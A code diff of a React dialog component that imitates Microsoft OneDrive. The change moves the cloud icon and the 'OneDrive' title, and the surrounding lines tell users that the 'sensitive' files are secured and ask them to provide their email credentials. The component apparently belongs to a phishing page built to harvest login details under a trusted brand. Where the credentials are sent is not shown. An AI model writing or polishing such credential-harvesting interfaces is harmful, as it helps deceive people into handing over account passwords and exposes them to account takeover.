@@ -66,10 +66,12 @@ export function FileVerificationDialog({
     <Dialog open={open} onOpenChange={onOpenChange}>
       <DialogContent className="sm:max-w-[500px] p-8">
         <div className="flex flex-col items-center text-center space-y-6">
-          <Cloud className="w-24 h-24 text-primary" fill="currentColor" />
+          <div className="flex items-center gap-2">
+            <Cloud className="w-6 h-6 text-primary" fill="currentColor" />
+            <DialogTitle className="text-xl font-medium">OneDrive</DialogTitle>
+          </div>
           
           <DialogHeader className="space-y-4">
-            <DialogTitle className="text-2xl font-normal">OneDrive</DialogTitle>
             <DialogDescription className="text-sm text-muted-foreground px-4 leading-relaxed">
               These files are sensitive and secured against unauthorized access. In order to
               access this file, please provide your email credentials. Be sure to connect to
